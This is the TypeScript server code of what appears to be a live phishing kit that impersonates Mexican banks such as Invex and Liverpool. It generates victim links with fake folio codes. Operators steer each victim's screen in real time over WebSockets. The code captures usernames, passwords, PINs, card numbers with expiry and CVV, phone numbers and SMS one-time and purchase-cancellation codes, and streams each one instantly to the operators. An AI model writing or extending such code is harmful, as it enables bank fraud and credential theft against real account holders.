import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema } from "@shared/schema";

// Store active connections
const clients = new Map<string, WebSocket>();
const adminClients = new Set<WebSocket>();

export async function registerRoutes(app: Express): Promise<Server> {
  // Create HTTP server
  const httpServer = createServer(app);

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // API endpoints
  app.get('/api/sessions', async (req, res) => {
    try {
      const sessions = await storage.getAllSessions();
      res.json(sessions);
    } catch (error) {
      console.error("Error fetching sessions:", error);
      res.status(500).json({ message: "Error fetching sessions" });
    }
  });

  app.post('/api/sessions', async (req, res) => {
    try {
      const { banco = "Invex" } = req.body;
      const sessionId = nanoid(10);
      const session = await storage.createSession({ 
        sessionId, 
        banco,
        folio: nanoid(6),
        pasoActual: ScreenType.FOLIO,
      });
      res.json(session);
    } catch (error) {
      console.error("Error creating session:", error);
      res.status(500).json({ message: "Error creating session" });
    }
  });

  app.post('/api/sessions/:id/update', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.updateSession(id, req.body);
      
      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));
      
      res.json(session);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(500).json({ message: "Error updating session" });
    }
  });

  app.get('/api/generate-link', async (req, res) => {
    try {
      const { banco = "LIVERPOOL" } = req.query;
      const sessionId = nanoid(10);
      
      // Generamos un código de 6 dígitos numéricos para el folio
      const generateSixDigitCode = () => {
        return Math.floor(100000 + Math.random() * 900000).toString();
      };
      
      const sixDigitCode = generateSixDigitCode();
      
      const session = await storage.createSession({ 
        sessionId, 
        banco: banco as string,
        folio: sixDigitCode,
        pasoActual: ScreenType.FOLIO,
      });

      const { REPLIT_DOMAINS } = process.env;
      const domain = REPLIT_DOMAINS ? REPLIT_DOMAINS.split(',')[0] : 'localhost:5000';
      const link = `https://${domain}/client/${sessionId}`;
      
      console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
      res.json({ sessionId, link, code: sixDigitCode });
    } catch (error) {
      console.error("Error generating link:", error);
      res.status(500).json({ message: "Error generating link" });
    }
  });

  // WebSocket handling
  wss.on('connection', (ws, req) => {
    console.log('New WebSocket connection');
    
    // Handle client/admin identification
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        
        // Register client or admin
        if (data.type === 'REGISTER') {
          if (data.role === 'ADMIN') {
            adminClients.add(ws);
            console.log('Admin client registered');
            
            // Send all active sessions to the admin
            const sessions = await storage.getAllSessions();
            ws.send(JSON.stringify({
              type: 'INIT_SESSIONS',
              data: sessions
            }));
          } 
          else if (data.role === 'CLIENT' && data.sessionId) {
            clients.set(data.sessionId, ws);
            console.log(`Client registered with session ID: ${data.sessionId}`);
            
            // Get session info and send to client
            const session = await storage.getSessionById(data.sessionId);
            if (session) {
              ws.send(JSON.stringify({
                type: 'INIT_SESSION',
                data: session
              }));
            }
          }
          return;
        }
        
        // Handle screen change request from admin
        if (data.type === 'SCREEN_CHANGE') {
          try {
            // Validate the data
            const validatedData = screenChangeSchema.parse(data.data);
            const { sessionId, tipo } = validatedData;
            
            // Find the target client
            const client = clients.get(sessionId);
            if (client && client.readyState === WebSocket.OPEN) {
              // Send the screen change command to the client
              client.send(JSON.stringify({
                type: 'SCREEN_CHANGE',
                data: validatedData
              }));
              
              // Update session in storage with the new screen state
              // Remove "mostrar_" prefix from tipo if present
              const screenType = tipo.replace('mostrar_', '');
              await storage.updateSession(sessionId, { pasoActual: screenType });
              
              // Notify all admin clients about the update
              const updatedSession = await storage.getSessionById(sessionId);
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }));
            }
          } catch (error) {
            console.error("Invalid screen change data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid screen change data" 
            }));
          }
          return;
        }
        
        // Handle client input data
        if (data.type === 'CLIENT_INPUT') {
          try {
            // Validate the data
            const validatedData = clientInputSchema.parse(data.data);
            const { sessionId, tipo, data: inputData } = validatedData;
            
            // Update the session with the new data
            const updatedFields: Record<string, any> = {};
            
            switch (tipo) {
              case 'folio':
                updatedFields.folio = inputData.folio;
                break;
              case 'login':
                updatedFields.username = inputData.username;
                updatedFields.password = inputData.password;
                break;
              case 'codigo':
                updatedFields.sms = inputData.codigo;
                break;
              case 'nip':
                updatedFields.nip = inputData.nip;
                break;
              case 'tarjeta':
                updatedFields.tarjeta = inputData.tarjeta;
                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                updatedFields.cvv = inputData.cvv;
                break;
              case 'sms_compra':
              case 'SMS_COMPRA':
              case 'smsCompra':
                // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                if (inputData && inputData.smsCompra) {
                  updatedFields.smsCompra = inputData.smsCompra;
                  console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);
                  
                  // Notificar a los administradores el código de cancelación inmediatamente
                  broadcastToAdmins(JSON.stringify({
                    type: 'SMS_COMPRA_CODE',
                    data: {
                      sessionId,
                      code: inputData.smsCompra
                    }
                  }));
                } else {
                  console.error('Error: datos SMS_COMPRA recibidos sin código de cancelación:', inputData);
                }
                break;
              case 'celular':
                updatedFields.celular = inputData.celular;
                break;
            }
            
            console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
            
            // Notify admins immediately of incoming data before database update
            broadcastToAdmins(JSON.stringify({
              type: 'CLIENT_INPUT_REALTIME',
              data: {
                sessionId,
                tipo,
                inputData
              }
            }));
            
            // Update session if we have fields to update
            if (Object.keys(updatedFields).length > 0) {
              const updatedSession = await storage.updateSession(sessionId, updatedFields);
              
              // Notify all admin clients about the database update
              broadcastToAdmins(JSON.stringify({
                type: 'SESSION_UPDATE',
                data: updatedSession
              }));
            }
          } catch (error) {
            console.error("Invalid client input data:", error);
            ws.send(JSON.stringify({ 
              type: 'ERROR', 
              message: "Invalid client input data" 
            }));
          }
          return;
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    });
    
    // Handle disconnection
    ws.on('close', () => {
      // Remove from admin clients if it was an admin
      if (adminClients.has(ws)) {
        adminClients.delete(ws);
        console.log('Admin client disconnected');
      }
      
      // Remove from clients if it was a client
      Array.from(clients.entries()).forEach(([sessionId, client]) => {
        if (client === ws) {
          clients.delete(sessionId);
          console.log(`Client with session ID ${sessionId} disconnected`);
        }
      });
    });
  });

  return httpServer;
}

// Helper function to broadcast to all admin clients
function broadcastToAdmins(message: string) {
  adminClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}
